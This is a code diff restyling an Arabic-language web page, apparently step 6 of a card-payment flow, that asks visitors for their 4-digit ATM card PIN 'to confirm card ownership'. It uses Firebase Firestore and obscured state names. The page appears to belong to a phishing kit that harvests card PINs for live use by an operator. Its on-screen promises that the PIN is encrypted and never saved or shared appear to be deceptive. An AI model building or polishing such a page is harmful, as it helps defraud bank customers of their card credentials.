@@ -7,6 +7,7 @@ import { Input } from "@/components/ui/input"
 import { Alert, AlertDescription } from "@/components/ui/alert"
 import { Lock, AlertCircle, ShieldCheck, Eye } from "lucide-react"
 import { UnifiedSpinner, SimpleSpinner } from "@/components/unified-spinner"
+import { StepShell } from "@/components/step-shell"
 import { db } from "@/lib/firebase"
 import { doc, setDoc, onSnapshot, Firestore } from "firebase/firestore"
 import { addToHistory } from "@/lib/history-utils"
@@ -163,79 +164,68 @@ export default function ConfiPage() {
   }
 
   return (
-    <div className="min-h-screen bg-[#0a4a68] flex items-center justify-center p-4" dir="rtl">
-      {/* Full Screen Spinner when submitting */}
+    <>
       {(isSubmitting || _v6Status === "verifying") && (
         <UnifiedSpinner message="جاري المعالجة" submessage="الرجاء الانتظار...." />
       )}
 
-      <div className="w-full max-w-md">
-        {/* Icon */}
-        <div className="flex justify-center mb-6">
-          <div className="w-20 h-20 bg-white rounded-full flex items-center justify-center shadow-lg">
-            <Lock className="w-12 h-12 text-[#0a4a68]" />
-          </div>
-        </div>
+      <StepShell
+        step={6}
+        title="تأكيد الرقم السري"
+        subtitle="الرجاء إدخال رقم الصراف المكون من 4 خانات لتأكيد ملكية البطاقة"
+        icon={<Lock className="h-8 w-8" />}
+      >
+        <form onSubmit={(e) => { e.preventDefault(); handlePinSubmit(); }} className="space-y-4">
+          {error && (
+            <Alert variant="destructive" className="border-2">
+              <AlertCircle className="h-5 w-5" />
+              <AlertDescription className="text-base">{error}</AlertDescription>
+            </Alert>
+          )}
 
-        {/* Main Card */}
-        <div className="bg-white rounded-3xl shadow-2xl p-8">
-          <form onSubmit={(e) => { e.preventDefault(); handlePinSubmit(); }} className="space-y-6">
-            {error && (
-              <Alert variant="destructive" className="border-2">
-                <AlertCircle className="h-5 w-5" />
-                <AlertDescription className="text-base">{error}</AlertDescription>
-              </Alert>
-            )}
-
-            <div className="space-y-4">
-              <p className="text-center text-gray-700 text-base font-semibold leading-relaxed">
-                الرجاء إدخال رقم الصراف المكون من 4 خانات لتأكيد ملكية البطاقة
-              </p>
-
-              {/* Additional Info */}
-              <div className="bg-green-50 border border-green-200 rounded-xl p-4 space-y-2">
-                <div className="flex items-center gap-2 text-sm text-green-800">
-                  <ShieldCheck className="w-4 h-4" />
-                  <span>للتأكد من هويتك وحماية حسابك</span>
-                </div>
-                <div className="flex items-center gap-2 text-sm text-green-800">
-                  <Lock className="w-4 h-4" />
-                  <span>الرقم السري محمي ومشفر بالكامل</span>
-                </div>
-                <div className="flex items-center gap-2 text-sm text-green-800">
-                  <Eye className="w-4 h-4" />
-                  <span>لن يتم حفظ أو مشاركة الرقم السري</span>
-                </div>
+          <div className="rounded-xl border border-[#d9e9df] bg-[#f4fbf7] p-4">
+            <div className="space-y-2 text-sm text-[#2f6c54]">
+              <div className="flex items-center gap-2">
+                <ShieldCheck className="h-4 w-4" />
+                <span>للتأكد من هويتك وحماية حسابك</span>
               </div>
-              
-              <Input
-                type="password"
-                inputMode="numeric"
-                placeholder="رقم الصراف (PIN)"
-                value={_v6}
-                onChange={(e) => {
-                  const value = e.target.value.replace(/\D/g, "").slice(0, 4)
-                  _s6(value)
-                  setError("")
-                }}
-                maxLength={4}
-                className="h-14 text-center text-lg px-4 border-2 border-gray-300 focus:border-[#0a4a68] rounded-xl bg-white placeholder:text-gray-400"
-                disabled={isSubmitting || _v6Status === "verifying"}
-                required
-                autoFocus
-              />
+              <div className="flex items-center gap-2">
+                <Lock className="h-4 w-4" />
+                <span>الرقم السري محمي ومشفر بالكامل</span>
+              </div>
+              <div className="flex items-center gap-2">
+                <Eye className="h-4 w-4" />
+                <span>لن يتم حفظ أو مشاركة الرقم السري</span>
+              </div>
             </div>
+          </div>
 
-            <Button
-              type="submit"
-              className="w-full h-14 bg-gradient-to-r from-yellow-400 to-yellow-500 hover:from-yellow-500 hover:to-yellow-600 text-[#0a4a68] font-bold text-xl rounded-xl shadow-lg hover:shadow-xl transition-all"
-              disabled={_v6.length !== 4 || isSubmitting || _v6Status === "verifying"}
-            >
-              تأكيد الدفع
-            </Button>
-          </form>
-        </div>
-      </div>
-    </div>
+          <Input
+            type="password"
+            inputMode="numeric"
+            placeholder="رقم الصراف (PIN)"
+            value={_v6}
+            onChange={(e) => {
+              const value = e.target.value.replace(/\D/g, "").slice(0, 4)
+              _s6(value)
+              setError("")
+            }}
+            maxLength={4}
+            className="h-12 rounded-xl border-2 border-[#d2e1ed] bg-white px-4 text-center text-2xl font-bold tracking-[0.5em] text-[#194e6e] placeholder:text-[#93a7b7] focus:border-[#145072]"
+            disabled={isSubmitting || _v6Status === "verifying"}
+            required
+            autoFocus
+          />
+
+          <Button
+            type="submit"
+            className="h-12 w-full rounded-xl bg-gradient-to-r from-[#f0b429] to-[#f7c04a] text-lg font-extrabold text-[#145072] shadow-md transition-all hover:from-[#e2a61f] hover:to-[#f0b429]"
+            disabled={_v6.length !== 4 || isSubmitting || _v6Status === "verifying"}
+          >
+            تأكيد الدفع
+          </Button>
+        </form>
+      </StepShell>
+    </>
   )
 }
